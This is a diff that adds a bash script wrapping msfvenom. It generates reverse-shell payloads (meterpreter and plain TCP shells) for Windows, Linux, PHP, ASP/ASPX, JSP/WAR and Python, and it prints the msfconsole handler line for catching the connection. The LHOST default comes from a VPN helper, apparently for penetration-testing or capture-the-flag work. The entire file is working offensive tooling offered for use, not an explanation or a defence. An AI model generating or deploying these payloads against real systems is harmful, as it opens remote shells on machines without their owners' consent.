@@ -1,0 +1,27 @@
+#!/usr/bin/env bash
+# payload <type> [lport] [lhost]   generate a reverse-shell payload with msfvenom
+#   types: linux windows php asp aspx jsp war python elf exe
+#   e.g.  payload windows 4444   ->  shell.exe + the listener line
+set -u
+t="${1:-}"; lport="${2:-4444}"
+lhost="${3:-$(~/.local/bin/hackbar vpn plain 2>/dev/null)}"; [ -z "$lhost" ] && lhost="$(hostname -I|awk '{print $1}')"
+[ -z "$t" ] && { echo "usage: payload <linux|windows|php|asp|aspx|jsp|war|python|elf|exe> [lport] [lhost]"; exit 1; }
+G=$'\e[38;2;158;206;106m'; B=$'\e[38;2;122;162;247m'; D=$'\e[38;2;86;95;137m'; X=$'\e[0m'
+declare -A P O
+P[windows]="windows/x64/meterpreter/reverse_tcp"; O[windows]="-f exe -o shell.exe"
+P[exe]="windows/x64/shell_reverse_tcp";           O[exe]="-f exe -o shell.exe"
+P[linux]="linux/x64/meterpreter/reverse_tcp";     O[linux]="-f elf -o shell.elf"
+P[elf]="linux/x64/shell_reverse_tcp";             O[elf]="-f elf -o shell.elf"
+P[php]="php/reverse_php";                          O[php]="-o shell.php"
+P[asp]="windows/shell/reverse_tcp";               O[asp]="-f asp -o shell.asp"
+P[aspx]="windows/x64/shell_reverse_tcp";          O[aspx]="-f aspx -o shell.aspx"
+P[jsp]="java/jsp_shell_reverse_tcp";              O[jsp]="-o shell.jsp"
+P[war]="java/jsp_shell_reverse_tcp";              O[war]="-f war -o shell.war"
+P[python]="python/meterpreter/reverse_tcp";       O[python]="-o shell.py"
+[ -z "${P[$t]:-}" ] && { echo "unknown type: $t"; exit 1; }
+echo "${B}generating${X} ${P[$t]}  LHOST=$lhost LPORT=$lport"
+msfvenom -p "${P[$t]}" LHOST="$lhost" LPORT="$lport" ${O[$t]} 2>/dev/null && echo "${G}done${X}"
+case "${P[$t]}" in
+  *meterpreter*) echo "${D}listener:${X} msfconsole -q -x 'use multi/handler;set payload ${P[$t]};set LHOST $lhost;set LPORT $lport;run'";;
+  *) echo "${D}listener:${X} listen $lport";;
+esac
